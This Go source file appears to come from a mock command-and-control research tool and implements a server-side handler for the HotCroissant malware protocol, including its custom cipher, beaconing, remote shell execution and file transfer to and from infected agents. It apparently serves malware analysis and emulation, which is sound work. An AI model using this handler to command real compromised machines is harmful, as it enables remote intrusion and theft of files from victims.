package hotcroissant

import (
	"bytes"
	"compress/zlib"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"

	"megaman.genesis.local/sknight/mockc2/internal/log"
	"megaman.genesis.local/sknight/mockc2/internal/queue"
	"megaman.genesis.local/sknight/mockc2/pkg/protocol"
)

const (
	beacon       = 0x7c8
	fileData     = 0x7e4
	fileComplete = 0x7e5
	fileDownload = 0x7e6
	fileStatus   = 0x7e7
	fileUpload   = 0x7ed
	shellStart   = 0xfa1
	shellData    = 0xfa2
	shellStop    = 0xfa3
)

// Handler is a HotCroissant protocol handler capable of communicating with the
// HotCroissant malware family.
type Handler struct {
	delegate     protocol.Delegate
	dataChan     chan byte
	uploadJobs   map[string]chan int32
	downloadJobs map[string]*os.File
}

type encodedCommand struct {
	compressedSize   uint32
	uncompressedSize uint32
	data             []byte
}

type command struct {
	opcode uint32
	txnID  int32
	opt1   int32
	opt2   int32
	opt3   int32
	size   uint32
	data   []byte
}

// SetDelegate saves the delegate for later use.
func (h *Handler) SetDelegate(delegate protocol.Delegate) {
	h.delegate = delegate
}

// Accept gives the Handler a chance to do something as soon as an agent
// connects.
func (h *Handler) Accept() {
}

// ReceiveData saves the network data and processes it when a full command has
// been received.
func (h *Handler) ReceiveData(data []byte) {
	log.Debug("received\n" + hex.Dump(data))

	if h.dataChan == nil {
		h.dataChan = make(chan byte, len(data))
		go h.processData()
	}

	queue.Put(h.dataChan, data)
}

// Close cleans up any uzed resources.
func (h *Handler) Close() {
	close(h.dataChan)
}

// NeedsTLS returns whether the protocol runs over TLS or not.
func (h *Handler) NeedsTLS() bool {
	return false
}

// Execute runs a command on the connected agent.
func (h *Handler) Execute(name string, args []string) {
	commandLine := strings.TrimSpace(name + " " + strings.Join(args, " "))

	// Start shell
	c := command{}
	c.opcode = shellStart
	c.opt1 = 0x0
	c.opt2 = 0x0
	c.opt3 = 0x0
	err := h.sendData(c)
	if err != nil {
		log.Warn("Error sending command: ", err)
	}

	// Execute command
	c = command{}
	c.opcode = shellData
	c.opt1 = 0x0
	c.opt2 = 0x0
	c.opt3 = 0x0
	c.size = uint32(len(commandLine))
	c.data = append([]byte(commandLine), 0x00)
	err = h.sendData(c)
	if err != nil {
		log.Warn("Error sending command: ", err)
	}

	// Wait for response
	time.Sleep(2 * time.Second)

	// Shut down shell
	c = command{}
	c.opcode = shellStop
	c.opt1 = 0x0
	c.opt2 = 0x0
	c.opt3 = 0x0
	err = h.sendData(c)
	if err != nil {
		log.Warn("Error sending command: ", err)
	}
}

// Upload sends a file to the connected agent.
func (h *Handler) Upload(source string, destination string) {
	if h.uploadJobs == nil {
		h.uploadJobs = make(map[string]chan int32)
	}

	// Start a file upload
	jobID := rand.Uint32()
	jobName := strconv.FormatInt(int64(jobID), 16)
	data := jobName + "|" + destination

	response := make(chan int32)

	h.uploadJobs[jobName] = response

	log.Info("Starting upload job %s", jobName)

	c := command{}
	c.opcode = fileUpload
	c.opt1 = int32(jobID)
	c.opt2 = 0x0
	c.opt3 = 0x0
	c.size = uint32(len(data))
	c.data = append([]byte(data), 0x00)
	err := h.sendData(c)
	if err != nil {
		log.Warn("Error sending command: ", err)
	}

	// Transfer data
	opt2 := <-response

	file, err := os.Open(source)
	if err != nil {
		log.Warn("Error opening source file: %v", err)
		return
	}
	defer file.Close()

	buf := make([]byte, 0x3a70)
	for {
		bytesRead, err := file.Read(buf)

		if err != nil {
			if err != io.EOF {
				log.Warn("Error reading source file; %v", err)
			}

			break
		}

		c = command{}
		c.opcode = fileData
		c.opt1 = int32(jobID)
		c.opt2 = opt2
		c.opt3 = int32(bytesRead)
		c.size = uint32(bytesRead)
		c.data = buf[:bytesRead]
		err = h.sendData(c)
		if err != nil {
			log.Warn("Error sending command: %v", err)
		}
	}

	// Finish the file transfer
	c = command{}
	c.opcode = fileComplete
	c.opt1 = int32(jobID)
	c.opt2 = opt2
	c.opt3 = 0x0
	err = h.sendData(c)
	if err != nil {
		log.Warn("Error sending command: ", err)
	}

	log.Success("Upload job %s complete", jobName)
}

// Download retrieves a file from the connected agent.
func (h *Handler) Download(source string, destination string) {
	if h.downloadJobs == nil {
		h.downloadJobs = make(map[string]*os.File)
	}

	// Start a file upload
	file, err := os.Create(destination)
	if err != nil {
		log.Warn("Error opening destination file: %v", err)
		return
	}

	jobID := rand.Uint32()
	jobName := strconv.FormatInt(int64(jobID), 16)
	data := jobName + "|" + source

	h.downloadJobs[jobName] = file

	log.Info("Starting download job %s", jobName)

	c := command{}
	c.opcode = fileDownload
	c.opt1 = int32(jobID)
	c.opt2 = 0x0
	c.opt3 = 0x0
	c.size = uint32(len(data))
	c.data = append([]byte(data), 0x00)
	err = h.sendData(c)
	if err != nil {
		log.Warn("Error sending command: ", err)
	}
}

func (h *Handler) processData() {
	for {
		ec := encodedCommand{}

		b, err := queue.Get(h.dataChan, 4)
		if err != nil {
			h.delegate.CloseConnection()
			return
		}
		ec.compressedSize = binary.LittleEndian.Uint32(b)

		b, err = queue.Get(h.dataChan, 4)
		if err != nil {
			h.delegate.CloseConnection()
			return
		}
		ec.uncompressedSize = binary.LittleEndian.Uint32(b)

		b, err = queue.Get(h.dataChan, int(ec.compressedSize))
		if err != nil {
			h.delegate.CloseConnection()
			return
		}
		ec.data = b

		// Validate rest of data is zlib compressed
		// zlib data will start with 789c default compression
		// The encryption always works the same on each byte
		// So we can check for cd31
		if ec.data[0] != 0xcd || ec.data[1] != 0x31 {
			h.delegate.CloseConnection()
			return
		}

		c, err := decodeCommand(ec)
		if err != nil {
			h.delegate.CloseConnection()
			return
		}

		h.proccessCommand(c)
	}
}

func (h *Handler) proccessCommand(command command) {
	logCommand(command)

	switch command.opcode {
	case beacon:
		hash := sha256.Sum256(command.data)
		id := hex.EncodeToString(hash[:])

		h.delegate.AgentConnected(id)
	case fileUpload:
		if command.opt2 == -1 {
			log.Warn("Error opening destination file")
		}

		jobName := string(command.data)
		if response, ok := h.uploadJobs[jobName]; ok {
			response <- command.opt2
		}
	case fileStatus:
		if strings.HasPrefix(string(command.data), "Failed to open") {
			log.Warn("Error opening source file")
			jobName := strconv.FormatInt(int64(uint32(command.opt1)), 16)

			file, ok := h.downloadJobs[jobName]
			if ok {
				file.Close()
				delete(h.downloadJobs, jobName)
			}
		}
	case fileData:
		jobName := strconv.FormatInt(int64(uint32(command.opt1)), 16)

		file, ok := h.downloadJobs[jobName]
		if ok {
			file.Write(command.data)
		}
	case fileComplete:
		jobName := strconv.FormatInt(int64(uint32(command.opt1)), 16)

		file, ok := h.downloadJobs[jobName]
		if ok {
			file.Close()
			delete(h.downloadJobs, jobName)
		}

		log.Success("Download job %s complete", jobName)
	case shellData:
		log.Info(string(command.data))
	}
}

func logCommand(c command) {
	log.Debug("HotCroissant Command")
	log.Debug("Opcode: 0x%08x", c.opcode)
	log.Debug("  Opt1: 0x%08x", uint32(c.opt1))
	log.Debug("  Opt2: 0x%08x", uint32(c.opt2))
	log.Debug("  Opt3: 0x%08x", uint32(c.opt3))
	log.Debug("  Size: 0x%08x", c.size)
	log.Debug("  Data:\n%s", hex.Dump(c.data))
}

func decodeCommand(ec encodedCommand) (command, error) {
	decrypted := cipher(ec.data)

	decompressed, err := decompress(decrypted)
	if err != nil {
		return command{}, err
	}

	buf := bytes.NewReader(decompressed)

	c := command{}
	err = binary.Read(buf, binary.LittleEndian, &c.opcode)
	if err != nil {
		return command{}, err
	}

	err = binary.Read(buf, binary.LittleEndian, &c.opt1)
	if err != nil {
		return command{}, err
	}

	err = binary.Read(buf, binary.LittleEndian, &c.opt2)
	if err != nil {
		return command{}, err
	}

	err = binary.Read(buf, binary.LittleEndian, &c.opt3)
	if err != nil {
		return command{}, err
	}

	err = binary.Read(buf, binary.LittleEndian, &c.size)
	if err != nil {
		return command{}, err
	}

	c.data = decompressed[20:]

	return c, nil
}

func (h *Handler) sendData(c command) error {
	ec, err := encodeCommand(c)
	if err != nil {
		return err
	}

	result := make([]byte, 8+len(ec.data))

	binary.LittleEndian.PutUint32(result[0:], ec.compressedSize)
	binary.LittleEndian.PutUint32(result[4:], ec.uncompressedSize)

	if len(ec.data) > 0 {
		copy(result[8:], ec.data)
	}

	h.delegate.SendData(result)

	return nil
}

func encodeCommand(c command) (encodedCommand, error) {
	var b bytes.Buffer

	binary.Write(&b, binary.LittleEndian, c.opcode)
	binary.Write(&b, binary.LittleEndian, c.opt1)
	binary.Write(&b, binary.LittleEndian, c.opt2)
	binary.Write(&b, binary.LittleEndian, c.opt3)
	binary.Write(&b, binary.LittleEndian, c.size)

	data := append(b.Bytes(), c.data...)

	log.Debug("encoded\n" + hex.Dump(data))

	ec := encodedCommand{}
	ec.uncompressedSize = uint32(len(data))

	compressed, err := compress(data)
	if err != nil {
		return ec, err
	}

	encrypted := cipher(compressed)

	ec.compressedSize = uint32(len(encrypted))
	ec.data = encrypted

	return ec, nil
}

func cipher(input []byte) []byte {
	output := make([]byte, len(input))

	key1 := 0x17
	key2 := 0x00b8d68b
	key3 := 0x02497029

	for i := 0; i < len(input); i++ {
		temp2 := key2
		temp3 := key3
		output[i] = byte((int(input[i]) ^ temp2 ^ temp3 ^ key1) & 0xff)
		key2 = key2>>8 | ((((key2*8 ^ key2) & 0x7f8) << 0x14) & 0xffffffff)
		key1 = key1&temp3 ^ (temp3^key1)&temp2
		key3 = key3>>8 | ((((((((key3*2^key3)<<4)&0xffffffff)^key3)&
			0xffffff80 ^ key3<<7) & 0xffffffff) << 0x11) & 0xffffffff)
	}

	return output
}

func compress(input []byte) ([]byte, error) {
	var b bytes.Buffer
	z, err := zlib.NewWriterLevel(&b, zlib.DefaultCompression)
	if err != nil {
		return nil, err
	}

	_, err = z.Write(input)
	if err != nil {
		return nil, err
	}

	z.Close()

	return b.Bytes(), nil
}

func decompress(input []byte) ([]byte, error) {
	b := bytes.NewReader(input)
	z, err := zlib.NewReader(b)
	if err != nil {
		return nil, err
	}
	defer z.Close()
	p, err := ioutil.ReadAll(z)
	if err != nil {
		return nil, err
	}
	return p, nil
}
